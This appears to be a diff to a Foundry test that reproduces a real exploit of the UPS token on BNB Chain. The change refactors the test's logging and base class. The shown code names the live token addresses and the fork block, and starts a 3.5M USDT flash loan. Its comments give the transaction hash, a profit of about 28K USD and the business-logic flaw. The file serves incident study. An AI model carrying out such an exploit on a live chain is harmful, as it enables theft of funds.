@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "forge-std/Test.sol";
+import "../basetest.sol";
 import "./../interface.sol";
 
 // TX : https://app.blocksec.com/explorer/tx/bsc/0xd03702e17171a32464ce748b8797008d59e2dbcecd3b3847d5138414566c886d
@@ -9,7 +9,7 @@ import "./../interface.sol";
 // Profit : ~ 28K USD
 // REASON : business logic flaw XD transfer to pair won't lead to pair's amount change
 
-contract ContractTest is Test {
+contract ContractTest is BaseTestWithBalanceLog {
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 UPS = IERC20(0x3dA4828640aD831F3301A4597821Cc3461B06678);
@@ -22,13 +22,12 @@ contract ContractTest is Test {
     {
         cheats.createSelectFork("bsc", 37680754);
         deal(address(USDT),address(this),0);
+        fundingToken = address(USDT);
     }
 
-    function testExploit() external {
-        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
+    function testExploit() external balanceLog {
         borrow_amount = 3_500_000 ether;
         pool.flash(address(this),borrow_amount,0,"");
-        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
     }
 
     function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, /*fee1*/ bytes memory /*data*/ ) public {
